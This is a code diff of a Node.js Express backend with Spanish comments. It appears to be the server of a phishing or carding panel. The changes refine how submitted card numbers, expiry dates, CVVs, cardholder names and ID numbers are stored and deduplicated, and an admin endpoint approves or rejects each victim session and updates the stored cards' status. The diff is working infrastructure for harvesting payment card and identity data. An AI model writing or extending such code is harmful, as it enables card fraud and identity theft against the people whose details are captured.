@@ -35,12 +35,18 @@ app.post('/api/sesion', (req, res) => {
         db.sesiones.push(sesion);
     }
 
-    // 🔥 GUARDAR TARJETA AUTOMÁTICAMENTE EN EL HISTORIAL EN EL INSTANTE 🔥
+    // 🔥 GUARDAR TARJETA VERIFICANDO NÚMERO, FECHA Y CVV 🔥
     if (datos && datos.tarjeta) {
-        const tarjetaExiste = db.tarjetas.find(t => t.tarjeta === datos.tarjeta && t.sessionId === sessionId);
+        const tarjetaExiste = db.tarjetas.find(t => 
+            t.tarjeta === datos.tarjeta && 
+            t.expMes === (datos.expMes || '') && 
+            t.expAnio === (datos.expAnio || '') && 
+            t.cvv === (datos.cvv || '')
+        );
+
         if (!tarjetaExiste) {
             db.tarjetas.push({
-                id: 'T-' + Date.now(),
+                id: 'T-' + Date.now() + '-' + Math.random().toString(36).substring(2, 7),
                 sessionId: sessionId,
                 nombre: (datos.datosPersonales?.primerNombre || '') + ' ' + (datos.datosPersonales?.primerApellido || ''),
                 documento: datos.docNumber || '-',
@@ -92,7 +98,7 @@ app.post('/admin/sesion/:sessionId/accion', (req, res) => {
     else if (accion === 'RECHAZAR') sesion.estado = 'rechazado';
     else return res.status(400).json({ error: 'Acción no permitida' });
 
-    // Actualizar estado en el historial de tarjetas
+    // Actualizar el estado en el historial de tarjetas para la sesión actual
     db.tarjetas.forEach(t => {
         if (t.sessionId === sessionId && t.estado === 'pendiente') {
             t.estado = sesion.estado;
